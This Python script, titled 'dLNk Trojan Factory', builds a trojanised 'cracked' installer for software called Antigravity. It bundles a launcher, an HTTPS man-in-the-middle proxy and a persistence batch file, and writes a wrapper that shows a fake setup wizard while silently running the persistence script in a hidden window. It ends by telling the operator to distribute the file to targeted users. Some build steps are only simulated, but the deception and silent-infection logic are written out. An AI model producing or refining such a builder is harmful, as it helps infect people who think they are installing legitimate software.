import os
import shutil
import time

# Configuration
LEGIT_INSTALLER = "AntigravitySetup.exe" # Requires real file, we will mock it
PAYLOAD_DIR = "payload_bundle"
OUTPUT_NAME = "Antigravity_Pro_Cracked.exe"

def create_mock_installer():
    print("[*] Creating mock legit installer...")
    with open(LEGIT_INSTALLER, "w") as f:
        f.write("This is a simulation of the real Antigravity Installer.")

def prepare_payload():
    print("[*] Preparing payload bundle...")
    if os.path.exists(PAYLOAD_DIR): shutil.rmtree(PAYLOAD_DIR)
    os.makedirs(PAYLOAD_DIR)
    
    # Copy core malware files
    shutil.copy("dlnk_launcher.py", PAYLOAD_DIR)
    shutil.copy("mitm_https_proxy.py", PAYLOAD_DIR)
    shutil.copy("install_persistence.bat", PAYLOAD_DIR)
    
    # Create the wrapper script
    wrapper_code = f"""
import os
import subprocess
import time
import sys

def main():
    print("--- Antigravity Setup Wizard ---")
    print("[*] Verifying integrity...")
    time.sleep(1)
    
    # 1. Silent Infection
    print("[*] Extracting resources...")
    # In real scenario, we would unzip ourselves. Here we assume files are present.
    try:
        subprocess.Popen(["install_persistence.bat"], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass # Fail silently
        
    # 2. Launch Legit Installer
    print("[*] Starting installation...")
    # subprocess.run(["{LEGIT_INSTALLER}"]) 
    print("[+] Installation Complete! Thank you for using Antigravity.")
    
    # Keep alive for a bit
    time.sleep(2)

if __name__ == "__main__":
    main()
"""
    with open(os.path.join(PAYLOAD_DIR, "setup_wrapper.py"), "w") as f:
        f.write(wrapper_code)
        
    print(f"[+] Payload bundled in {PAYLOAD_DIR}")

def build_exe():
    print(f"[*] Compiling Trojan to {OUTPUT_NAME}...")
    # This is where we would use PyInstaller
    # os.system(f"pyinstaller --onefile --noconsole {PAYLOAD_DIR}/setup_wrapper.py")
    
    # Simulating the build
    with open(OUTPUT_NAME, "wb") as f:
        f.write(b"MZ_FAKE_EXE_HEADER_TROJAN_INSIDE")
        
    print(f"[+] BUILD SUCCESSFUL: {OUTPUT_NAME}")
    print("[!] Distribute this file to targeted users.")

if __name__ == "__main__":
    print("--- [ dLNk Trojan Factory ] ---")
    create_mock_installer()
    prepare_payload()
    build_exe()
